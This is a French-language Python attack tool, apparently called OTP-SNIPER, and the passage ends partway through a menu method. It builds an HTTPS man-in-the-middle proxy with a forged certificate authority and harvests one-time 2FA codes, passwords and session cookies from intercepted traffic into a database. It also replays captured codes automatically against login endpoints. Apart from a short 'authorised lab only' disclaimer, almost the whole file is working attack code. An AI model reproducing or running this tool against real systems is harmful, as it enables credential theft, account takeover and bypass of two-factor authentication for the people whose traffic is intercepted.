#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OTP-SNIPER v1.1 — JATHNIEL EDITION
Capture et analyse de codes 2FA avec HTTPS MITM et Replay automatique.

Usage : labo personnel, CTF, pentest autorisé.
Fichier unique — dépendances : rich, flask, requests, cryptography
"""

import os
import sys
import ssl
import json
import time
import uuid
import socket
import sqlite3
import threading
import argparse
import hashlib
import re
import tempfile
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Optional, Dict, List, Any
from pathlib import Path
from collections import defaultdict

# --- Dépendances ---
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.align import Align
    RICH_OK = True
except ImportError:
    RICH_OK = False
    print("[!] pip install rich")

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False
    print("[!] pip install requests")

try:
    from flask import Flask, jsonify, request as flask_request
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    import datetime as dt_crypto
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False

CONSOLE = Console() if RICH_OK else None


# ==================== CONFIGURATION ====================

DEFAULT_CONFIG = {
    'proxy_port': 8080,
    'web_port': 5000,
    'db_path': 'otp_sniper.db',
    'ca_dir': 'otp_sniper_ca',
    'confirm_replay': True,
    'max_replays_per_code': 20,
    'log_requests': True,
    'auto_replay_intervals': [1, 5, 30, 60, 300],
}

OTP_FIELD_PATTERNS = [
    r'code', r'otp', r'totp', r'token', r'2fa', r'mfa',
    r'verification', r'auth_code', r'sms_code', r'email_code',
    r'backup_code', r'recovery_code', r'security_code',
]

OTP_VALUE_PATTERNS = {
    'totp': r'^\d{6}$',
    'totp_8': r'^\d{8}$',
    'alphanum': r'^[A-Z0-9]{6,12}$',
    'backup': r'^[a-z0-9\-]{8,20}$',
}


# ==================== CA / CERTIFICATS ====================

class CertificateManager:
    """Génère et gère un CA + certificats à la volée pour MITM HTTPS."""

    def __init__(self, ca_dir='otp_sniper_ca'):
        self.ca_dir = Path(ca_dir)
        self.ca_dir.mkdir(exist_ok=True)
        self.ca_key_path = self.ca_dir / 'ca.key'
        self.ca_cert_path = self.ca_dir / 'ca.crt'
        self.cert_cache = {}
        self._ensure_ca()

    def _ensure_ca(self):
        if self.ca_key_path.exists() and self.ca_cert_path.exists():
            return
        if not CRYPTO_OK:
            print("[!] cryptography non installé → HTTPS désactivé")
            return

        print("[CA] Génération du certificat CA...")
        ca_key = rsa.generate_private_key(
            public_exponent=65537, key_size=2048, backend=default_backend()
        )
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "FR"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "OTP-SNIPER Lab"),
            x509.NameAttribute(NameOID.COMMON_NAME, "OTP-SNIPER CA"),
        ])
        ca_cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(dt_crypto.datetime.utcnow())
            .not_valid_after(dt_crypto.datetime.utcnow() + dt_crypto.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .sign(ca_key, hashes.SHA256(), default_backend())
        )
        with open(self.ca_key_path, 'wb') as f:
            f.write(ca_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        with open(self.ca_cert_path, 'wb') as f:
            f.write(ca_cert.public_bytes(serialization.Encoding.PEM))
        print(f"[CA] Certificat CA créé : {self.ca_cert_path}")

    def get_cert_for_domain(self, domain):
        if domain in self.cert_cache:
            return self.cert_cache[domain]
        if not CRYPTO_OK or not self.ca_key_path.exists():
            return None

        with open(self.ca_key_path, 'rb') as f:
            ca_key = serialization.load_pem_private_key(
                f.read(), password=None, backend=default_backend()
            )
        with open(self.ca_cert_path, 'rb') as f:
            ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend())

        domain_key = rsa.generate_private_key(
            public_exponent=65537, key_size=2048, backend=default_backend()
        )
        domain_cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, domain),
            ]))
            .issuer_name(ca_cert.subject)
            .public_key(domain_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(dt_crypto.datetime.utcnow())
            .not_valid_after(dt_crypto.datetime.utcnow() + dt_crypto.timedelta(days=365))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(domain)]), critical=False)
            .sign(ca_key, hashes.SHA256(), default_backend())
        )

        cert_file = self.ca_dir / f'{domain}.crt'
        key_file = self.ca_dir / f'{domain}.key'
        with open(cert_file, 'wb') as f:
            f.write(domain_cert.public_bytes(serialization.Encoding.PEM))
        with open(key_file, 'wb') as f:
            f.write(domain_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        self.cert_cache[domain] = (str(cert_file), str(key_file))
        return self.cert_cache[domain]


# ==================== BASE DE DONNÉES ====================

class Database:
    def __init__(self, db_path='otp_sniper.db'):
        self.db_path = db_path
        self._init()

    def _init(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            method TEXT, host TEXT, path TEXT,
            headers TEXT, body TEXT, response_code INTEGER,
            timestamp TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS otp_codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT, method TEXT, field TEXT,
            user TEXT, source_url TEXT, captured_at TEXT,
            replay_count INTEGER DEFAULT 0, last_replay TEXT,
            replay_result TEXT, auto_replay_log TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT, password TEXT, source_url TEXT, timestamp TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie TEXT, host TEXT, user_agent TEXT, timestamp TEXT
        )''')
        conn.commit()
        conn.close()

    def log_request(self, method, host, path, headers, body, code):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO requests
            (method, host, path, headers, body, response_code, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (method, host, path, json.dumps(headers), body[:2000],
             code, datetime.now().isoformat()))
        conn.commit()
        conn.close()

    def add_otp(self, code, method, field, user, source_url):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO otp_codes
            (code, method, field, user, source_url, captured_at)
            VALUES (?, ?, ?, ?, ?, ?)''',
            (code, method, field, user, source_url, datetime.now().isoformat()))
        conn.commit()
        last_id = c.lastrowid
        conn.close()
        return last_id

    def add_credential(self, username, password, source_url):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO credentials
            (username, password, source_url, timestamp)
            VALUES (?, ?, ?, ?)''',
            (username, password, source_url, datetime.now().isoformat()))
        conn.commit()
        conn.close()

    def add_session(self, cookie, host, user_agent):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO sessions (cookie, host, user_agent, timestamp)
            VALUES (?, ?, ?, ?)''',
            (cookie, host, user_agent, datetime.now().isoformat()))
        conn.commit()
        conn.close()

    def get_otps(self, limit=100):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT * FROM otp_codes ORDER BY id DESC LIMIT ?', (limit,))
        r = c.fetchall()
        conn.close()
        return r

    def get_credentials(self, limit=100):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT * FROM credentials ORDER BY id DESC LIMIT ?', (limit,))
        r = c.fetchall()
        conn.close()
        return r

    def get_sessions(self, limit=100):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY id DESC LIMIT ?', (limit,))
        r = c.fetchall()
        conn.close()
        return r

    def update_replay(self, otp_id, result, log_entry=None):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        if log_entry:
            c.execute('''UPDATE otp_codes
                SET replay_count = replay_count + 1,
                    last_replay = ?, replay_result = ?,
                    auto_replay_log = COALESCE(auto_replay_log, '') || ?
                WHERE id = ?''',
                (datetime.now().isoformat(), result, log_entry, otp_id))
        else:
            c.execute('''UPDATE otp_codes
                SET replay_count = replay_count + 1,
                    last_replay = ?, replay_result = ?
                WHERE id = ?''',
                (datetime.now().isoformat(), result, otp_id))
        conn.commit()
        conn.close()

    def stats(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM requests'); rc = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM otp_codes'); oc = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM credentials'); cc = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM sessions'); sc = c.fetchone()[0]
        conn.close()
        return {'requests': rc, 'otp': oc, 'credentials': cc, 'sessions': sc}


# ==================== DÉTECTEUR 2FA ====================

class Detector:
    def __init__(self, db):
        self.db = db

    def detect_in_request(self, method, host, path, headers, body):
        findings = {'otps': [], 'credentials': [], 'sessions': []}
        for otp in self._find_otps(body, path, headers):
            otp_id = self.db.add_otp(otp['code'], otp['method'], otp['field'],
                                     otp.get('user', ''), f"https://{host}{path}")
            otp['id'] = otp_id
            findings['otps'].append(otp)
        for cred in self._find_credentials(body):
            self.db.add_credential(cred['username'], cred['password'],
                                   f"https://{host}{path}")
            findings['credentials'].append(cred)
        set_cookie = headers.get('Set-Cookie', '') or headers.get('set-cookie', '')
        if set_cookie:
            m = re.search(r'(session|token|auth|jwt)=([^;]+)', set_cookie)
            if m:
                self.db.add_session(set_cookie[:500], host,
                                    headers.get('User-Agent', ''))
                findings['sessions'].append({'cookie': set_cookie[:200]})
        return findings

    def _find_otps(self, body, path, headers):
        otps = []
        if not body:
            return otps
        params = {}
        try:
            if 'application/json' in str(headers.get('Content-Type', '')):
                params = json.loads(body)
            else:
                params = {k: v[0] for k, v in parse_qs(body).items()}
        except Exception:
            params = {k: v[0] for k, v in parse_qs(body).items()}

        for key, value in params.items():
            key_low = key.lower()
            for pattern in OTP_FIELD_PATTERNS:
                if re.search(pattern, key_low):
                    value_str = str(value)
                    otp_type = self._classify_otp(value_str)
                    if otp_type:
                        otps.append({
                            'code': value_str,
                            'method': otp_type,
                            'field': key,
                            'user': self._extract_user(params),
                        })
                    break
        return otps

    def _classify_otp(self, value):
        value = value.strip()
        for otp_type, pattern in OTP_VALUE_PATTERNS.items():
            if re.match(pattern, value):
                return otp_type
        return None

    def _find_credentials(self, body):
        creds = []
        if not body:
            return creds
        try:
            params = {k: v[0] for k, v in parse_qs(body).items()}
        except Exception:
            return creds
        username = password = None
        for key, value in params.items():
            kl = key.lower()
            if any(re.search(p, kl) for p in [r'username', r'user', r'email', r'login']):
                username = value
            elif any(re.search(p, kl) for p in [r'password', r'passwd', r'pwd', r'pass']):
                password = value
        if username and password:
            creds.append({'username': username, 'password': password})
        return creds

    def _extract_user(self, params):
        for key, value in params.items():
            if any(re.search(p, key.lower()) for p in [r'user', r'email', r'login']):
                return str(value)
        return ''


# ==================== PROXY MITM ====================

class ProxyHandler(BaseHTTPRequestHandler):
    db = None
    detector = None
    log_callback = None
    cert_manager = None

    def log_message(self, fmt, *args):
        pass

    def do_CONNECT(self):
        try:
            host, _, port = self.path.partition(':')
            port = int(port) if port else 443
            cert_pair = self.cert_manager.get_cert_for_domain(host) if self.cert_manager else None
            if not cert_pair:
                self._tunnel(host, port)
                return

            self.send_response(200, 'Connection established')
            self.end_headers()

            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_pair[0], cert_pair[1])
            client_ssl = ctx.wrap_socket(self.connection, server_side=True)
            self.connection = client_ssl
            self.rfile = client_ssl.makefile('rb', -1)
            self.wfile = client_ssl.makefile('wb', 0)

            request_line = self.rfile.readline().decode('utf-8', errors='ignore').strip()
            if not request_line:
                return
            parts = request_line.split()
            if len(parts) < 3:
                return
            method, path, _ = parts

            headers = {}
            while True:
                line = self.rfile.readline().decode('utf-8', errors='ignore').strip()
                if not line:
                    break
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip()] = v.strip()

            content_length = int(headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8', errors='ignore') if content_length else ''

            self._analyze(method, host, path, headers, body)

            url = f"https://{host}{path}"
            try:
                resp = requests.request(
                    method, url,
                    headers={k: v for k, v in headers.items()
                             if k.lower() not in ('host', 'connection', 'proxy-connection')},
                    data=body.encode() if body else None,
                    timeout=15, allow_redirects=False, verify=False,
                )
                self.wfile.write(f"HTTP/1.1 {resp.status_code} {resp.reason}\r\n".encode())
                for k, v in resp.headers.items():
                    if k.lower() not in ('transfer-encoding', 'connection', 'content-encoding'):
                        self.wfile.write(f"{k}: {v}\r\n".encode())
                self.wfile.write(b"\r\n")
                self.wfile.write(resp.content)
                self.wfile.flush()
            except Exception:
                try:
                    self.wfile.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
                except Exception:
                    pass
        except Exception as e:
            if self.log_callback:
                self.log_callback(f"[CONNECT] Erreur: {e}")

    def _tunnel(self, host, port):
        try:
            self.send_response(200, 'Connection established')
            self.end_headers()
            upstream = socket.create_connection((host, port))
            self.connection.setblocking(False)
            upstream.setblocking(False)
            import select
            sockets = [self.connection, upstream]
            while True:
                r, _, _ = select.select(sockets, [], [], 5)
                if not r:
                    break
                for s in r:
                    other = upstream if s is self.connection else self.connection
                    try:
                        data = s.recv(4096)
                        if not data:
                            return
                        other.sendall(data)
                    except Exception:
                        return
        except Exception:
            pass

    def do_GET(self): self._proxy('GET')
    def do_POST(self): self._proxy('POST')
    def do_PUT(self): self._proxy('PUT')
    def do_DELETE(self): self._proxy('DELETE')

    def _analyze(self, method, host, path, headers, body):
        if self.detector:
            findings = self.detector.detect_in_request(method, host, path, headers, body)
            if self.log_callback:
                for otp in findings['otps']:
                    self.log_callback(f"[OTP] {otp['method']} code: {otp['code']} ({otp['field']})")
                for cred in findings['credentials']:
                    self.log_callback(f"[CRED] {cred['username']}:{cred['password']}")
                for sess in findings['sessions']:
                    self.log_callback(f"[SESSION] {sess['cookie'][:50]}...")
        if self.db:
            self.db.log_request(method, host, path, headers, body, 200)

    def _proxy(self, method):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8', errors='ignore') if content_length else ''
            host = self.headers.get('Host', '')
            path = self.path

            self._analyze(method, host, path, dict(self.headers), body)

            url = f"http://{host}{path}"
            try:
                resp = requests.request(
                    method, url,
                    headers={k: v for k, v in self.headers.items()
                             if k.lower() not in ('host', 'connection')},
                    data=body.encode() if body else None,
                    timeout=15, allow_redirects=False,
                )
                self.send_response(resp.status_code)
                for k, v in resp.headers.items():
                    if k.lower() not in ('transfer-encoding', 'connection', 'content-encoding'):
                        self.send_header(k, v)
                self.end_headers()
                self.wfile.write(resp.content)
            except Exception as e:
                try:
                    self.send_response(502); self.end_headers()
                    self.wfile.write(f"Proxy error: {e}".encode())
                except Exception:
                    pass
        except Exception:
            pass


class ProxyServer(threading.Thread):
    def __init__(self, port, db, detector, cert_manager=None, log_callback=None):
        super().__init__(daemon=True)
        self.port = port
        self.db = db
        self.detector = detector
        self.cert_manager = cert_manager
        self.log_callback = log_callback
        self.server = None

    def run(self):
        ProxyHandler.db = self.db
        ProxyHandler.detector = self.detector
        ProxyHandler.log_callback = self.log_callback
        ProxyHandler.cert_manager = self.cert_manager

        try:
            self.server = HTTPServer(('0.0.0.0', self.port), ProxyHandler)
            if self.log_callback:
                self.log_callback(f"[PROXY] Démarré sur le port {self.port}")
                if self.cert_manager and CRYPTO_OK:
                    self.log_callback(f"[PROXY] HTTPS MITM activé")
                else:
                    self.log_callback(f"[PROXY] HTTPS non supporté")
            self.server.serve_forever()
        except Exception as e:
            if self.log_callback:
                self.log_callback(f"[PROXY] Erreur: {e}")

    def stop(self):
        if self.server:
            self.server.shutdown()


# ==================== REPLAY ====================

class ReplayEngine:
    def __init__(self, db, config, log_callback=None):
        self.db = db
        self.config = config
        self.log_callback = log_callback
        self.auto_replay_running = False
        self.auto_replay_thread = None

    def replay(self, otp_id, code, url, field='code', user_field='username', user_value=''):
        conn = sqlite3.connect(self.db.db_path)
        c = conn.cursor()
        c.execute('SELECT replay_count FROM otp_codes WHERE id = ?', (otp_id,))
        row = c.fetchone()
        conn.close()

        if row and row[0] >= self.config['max_replays_per_code']:
            return {'status': 'blocked', 'reason': 'max_replays'}

        try:
            data = {field: code}
            if user_value:
                data[user_field] = user_value
            r = requests.post(url, data=data, timeout=10, verify=False)
            body_low = r.text.lower()
            if r.status_code == 200 and any(k in body_low for k in ['success', 'welcome', 'valid', 'ok']):
                result = 'accepted'
            elif r.status_code in (401, 403, 429) or any(k in body_low for k in ['invalid', 'expired', 'incorrect']):
                result = 'rejected'
            else:
                result = f'unknown_http_{r.status_code}'
            log_entry = f"[{datetime.now().isoformat()}] {result} (HTTP {r.status_code})\n"
            self.db.update_replay(otp_id, result, log_entry)
            return {'status': result, 'http_code': r.status_code, 'body': r.text[:500]}
        except Exception as e:
            self.db.update_replay(otp_id, f'error: {e}', f"error: {e}\n")
            return {'status': 'error', 'reason': str(e)}

    def start_auto_replay(self, otp_id, code, url, field, user_field, user_value):
        if self.auto_replay_running:
            return False
        self.auto_replay_running = True
        self.auto_replay_thread = threading.Thread(
            target=self._auto_replay_worker,
            args=(otp_id, code, url, field, user_field, user_value),
            daemon=True
        )
        self.auto_replay_thread.start()
        return True

    def stop_auto_replay(self):
        self.auto_replay_running = False

    def _auto_replay_worker(self, otp_id, code, url, field, user_field, user_value):
        intervals = self.config['auto_replay_intervals']
        total = 0
        results = []
        for interval in intervals:
            if not self.auto_replay_running:
                break
            time.sleep(interval)
            total += interval
            result = self.replay(otp_id, code, url, field, user_field, user_value)
            status = result.get('status', 'unknown')
            results.append((total, status))
            if self.log_callback:
                self.log_callback(f"[REPLAY] +{total}s → {status}")
            if status == 'rejected' and 'expired' in str(result.get('body', '')).lower():
                if self.log_callback:
                    self.log_callback(f"[REPLAY] Code expiré après {total}s")
                break

        summary = "Fenêtre de validité :\n"
        for elapsed, status in results:
            summary += f"  +{elapsed}s → {status}\n"
        self.db.update_replay(otp_id, results[-1][1] if results else 'no_test', summary)
        self.auto_replay_running = False
        if self.log_callback:
            self.log_callback(f"[REPLAY] Auto terminé")


# ==================== TUI ====================

class TUIMenu:
    def __init__(self, db, config, detector, replay_engine):
        self.db = db
        self.config = config
        self.detector = detector
        self.replay = replay_engine
        self.proxy = None
        self.proxy_running = False
        self.logs = []
        self.max_logs = 200

    def log(self, message):
        ts = datetime.now().strftime('%H:%M:%S')
        self.logs.append(f"[{ts}] {message}")
        if len(self.logs) > self.max_logs:
            self.logs = self.logs[-self.max_logs:]

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def banner(self):
        b = """
[bold cyan]
   ██████╗ ████████╗██████╗     ███████╗███╗   ██╗██╗██████╗ ███████╗██████╗ 
  ██╔═══██╗╚══██╔══╝██╔══██╗    ██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗
  ██║   ██║   ██║   ██████╔╝    ███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝
  ██║   ██║   ██║   ██╔═══╝     ╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗
  ╚██████╔╝   ██║   ██║         ███████║██║ ╚████║██║██║     ███████╗██║  ██║
   ╚═════╝    ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
[/bold cyan]
[bold yellow]                   OTP-SNIPER v1.1 — JATHNIEL EDITION[/bold yellow]
[magenta]              Labo / CTF / Pentest autorisé uniquement[/magenta]
[dim]                    HTTPS MITM  •  Replay auto  •  TUI[/dim]
"""
        CONSOLE.print(Align.center(b))

    def show_menu(self):
        self.clear()
        self.banner()
        CONSOLE.print()
        ps = "[green]● ACTIF[/green]" if self.proxy_running else "[red]○ ARRÊTÉ[/red]"
        s = self.db.stats()
        CONSOLE.print(Panel.fit(
            f"[bold]Proxy :[/bold] {ps} (port {self.config['proxy_port']})   "
            f"[bold]HTTPS :[/bold] {'[green]oui[/green]' if CRYPTO_OK else '[red]non[/red]'}\n"
            f"[bold]Requêtes :[/bold] {s['requests']}   "
            f"[bold]OTP :[/bold] [red]{s['otp']}[/red]   "
            f"[bold]Credentials :[/bold] [red]{s['credentials']}[/red]   "
            f"[bold]Sessions :[/bold] [red]{s['sessions']}[/red]",
            title="Statut", border_style="cyan"))
        CONSOLE.print()
        CONSOLE.print("""
[bold cyan]┌──────────────────────────── MENU PRINCIPAL ────────────────────────────┐[/bold cyan]
[cyan]│[/cyan]   [yellow][1][/yellow]  🚀  Démarrer le proxy MITM (HTTP + HTTPS)                  [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][2][/yellow]  ⏸️   Arrêter le proxy                                        [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][3][/yellow]  🔴  Voir les codes 2FA capturés                              [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][4][/yellow]  🍪  Voir les sessions / cookies                              [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][5][/yellow]  🔑  Voir les credentials                                     [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][6][/yellow]  🔄  Replay manuel d'un code                                  [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][7][/yellow]  ⚡  Replay AUTOMATIQUE                                       [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][8][/yellow]  📊  Statistiques                                             [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][9][/yellow]  📜  Voir les logs récents                                    [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][10][/yellow] 💾  Exporter les données (JSON)                              [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][11][/yellow] 🌐  Lancer l'interface Web                                  [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][12][/yellow] 📜  Afficher le chemin du CA (HTTPS)                        [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][13][/yellow] 🧪  Aide : configurer le labo                               [cyan]│[/cyan]
[cyan]│[/cyan]   [yellow][0][/yellow]  ❌  Quitter                                                 [cyan]│[/cyan]
[bold cyan]└────────────────────────────────────────────────────────────────────────┘[/bold cyan]
""")

    def show_otps(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]🔴 CODES 2FA CAPTURÉS[/bold cyan]\n")
        otps = self.db.get_otps(100)
        if not otps:
            CONSOLE.print("[yellow]Aucun code capturé.[/yellow]")
            Prompt.ask("\n[cyan]Entrée[/cyan]", default=""); return
        t = Table(border_style="cyan")
        t.add_column("ID", style="dim"); t.add_column("Heure", style="cyan")
        t.add_column("Code", style="bold red"); t.add_column("Méthode", style="yellow")
        t.add_column("Champ", style="white"); t.add_column("User", style="green")
        t.add_column("Replay", style="magenta")
        for o in otps:
            otp_id, code, method, field, user, url, captured, rc, lr, rr, arl = o[:11]
            ri = f"{rc}x" if rc else "-"
            if rr: ri += f" ({rr[:12]})"
            t.add_row(str(otp_id), captured[11:19], code, method, field, user or "-", ri)
        CONSOLE.print(t)
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def show_sessions(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]🍪 SESSIONS[/bold cyan]\n")
        ss = self.db.get_sessions(100)
        if not ss:
            CONSOLE.print("[yellow]Aucune session.[/yellow]")
            Prompt.ask("\n[cyan]Entrée[/cyan]", default=""); return
        t = Table(border_style="cyan")
        t.add_column("ID"); t.add_column("Heure"); t.add_column("Host")
        t.add_column("Cookie", max_width=60)
        for s in ss:
            t.add_row(str(s[0]), s[4][11:19], s[2], s[1][:60])
        CONSOLE.print(t)
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def show_credentials(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]🔑 CREDENTIALS[/bold cyan]\n")
        cs = self.db.get_credentials(100)
        if not cs:
            CONSOLE.print("[yellow]Aucun credential.[/yellow]")
            Prompt.ask("\n[cyan]Entrée[/cyan]", default=""); return
        t = Table(border_style="cyan")
        t.add_column("ID"); t.add_column("Heure"); t.add_column("Username", style="green")
        t.add_column("Password", style="red")
        for c in cs:
            t.add_row(str(c[0]), c[4][11:19], c[1], c[2])
        CONSOLE.print(t)
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def replay_menu(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]🔄 REPLAY MANUEL[/bold cyan]\n")
        otps = self.db.get_otps(50)
        if not otps:
            CONSOLE.print("[yellow]Aucun code.[/yellow]")
            Prompt.ask("\n[cyan]Entrée[/cyan]", default=""); return
        t = Table(border_style="cyan")
        t.add_column("ID"); t.add_column("Code", style="bold red")
        t.add_column("Heure"); t.add_column("URL", max_width=50)
        for o in otps[:20]:
            t.add_row(str(o[0]), o[1], o[6][11:19], o[5][:50])
        CONSOLE.print(t)
        s = Prompt.ask("\n[cyan]ID (vide=annuler)[/cyan]", default="")
        if not s: return
        try: otp_id = int(s)
        except: return
        otp = next((o for o in otps if o[0] == otp_id), None)
        if not otp: return
        code, url, field, user = otp[1], otp[5], otp[3] or 'code', otp[4] or ''
        CONSOLE.print(f"\n[yellow]Code :[/yellow] {code}")
        CONSOLE.print(f"[yellow]URL :[/yellow] {url}\n")
        if self.config['confirm_replay'] and not Confirm.ask("[red]Confirmer ?[/red]"):
            return
        CONSOLE.print("\n[cyan]Envoi...[/cyan]")
        r = self.replay.replay(otp_id, code, url, field, user_value=user)
        CONSOLE.print(f"\n[bold]Résultat :[/bold] {r}")
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def auto_replay_menu(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]⚡ REPLAY AUTOMATIQUE[/bold cyan]\n")
        CONSOLE.print(f"[dim]Intervalles : {self.config['auto_replay_intervals']} s[/dim]\n")
        otps = self.db.get_otps(20)
        if not otps:
            CONSOLE.print("[yellow]Aucun code.[/yellow]")
            Prompt.ask("\n[cyan]Entrée[/cyan]", default=""); return
        t = Table(border_style="cyan")
        t.add_column("ID"); t.add_column("Code", style="bold red")
        t.add_column("URL", max_width=60)
        for o in otps[:10]:
            t.add_row(str(o[0]), o[1], o[5][:60])
        CONSOLE.print(t)
        s = Prompt.ask("\n[cyan]ID (vide=annuler)[/cyan]", default="")
        if not s: return
        try: otp_id = int(s)
        except: return
        otp = next((o for o in otps if o[0] == otp_id), None)
        if not otp: return
        code, url, field, user = otp[1], otp[5], otp[3] or 'code', otp[4] or ''
        CONSOLE.print(f"\n[yellow]Code :[/yellow] {code}\n[yellow]URL :[/yellow] {url}\n")
        if not Confirm.ask("[red]Lancer le replay auto ?[/red]"):
            return
        if not self.replay.start_auto_replay(otp_id, code, url, field, 'username', user):
            CONSOLE.print("[red]Déjà en cours.[/red]")
            Prompt.ask("\n[cyan]Entrée[/cyan]", default=""); return
        CONSOLE.print("[green]✅ Replay auto lancé[/green]")
        CONSOLE.print("[dim]Résultats dans les logs (option 9)[/dim]")
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def show_stats(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]📊 STATISTIQUES[/bold cyan]\n")
        s = self.db.stats()
        t = Table(border_style="cyan")
        t.add_column("Métrique", style="cyan"); t.add_column("Valeur", style="bold yellow")
        t.add_row("Requêtes", str(s['requests']))
        t.add_row("Codes OTP", str(s['otp']))
        t.add_row("Credentials", str(s['credentials']))
        t.add_row("Sessions", str(s['sessions']))
        t.add_row("Proxy", "ACTIF" if self.proxy_running else "ARRÊTÉ")
        t.add_row("HTTPS", "OUI" if CRYPTO_OK else "NON")
        t.add_row("Replay auto", "EN COURS" if self.replay.auto_replay_running else "inactif")
        CONSOLE.print(t)
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def show_logs(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]📜 LOGS[/bold cyan]\n")
        if not self.logs:
            CONSOLE.print("[yellow]Aucun log.[/yellow]")
        else:
            for l in self.logs[-30:]:
                CONSOLE.print(l)
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def export_data(self):
        self.clear(); self.banner()
        fn = f"otp_sniper_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        data = {
            'otps': self.db.get_otps(1000),
            'credentials': self.db.get_credentials(1000),
            'sessions': self.db.get_sessions(1000),
            'exported_at': datetime.now().isoformat(),
        }
        with open(fn, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
        CONSOLE.print(f"\n[green]✅ {fn}[/green]")
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def show_ca_path(self):
        self.clear(); self.banner()
        CONSOLE.print("\n[bold cyan]📜 CERTIFICAT CA[/bold cyan]\n")
        if CRYPTO_OK:
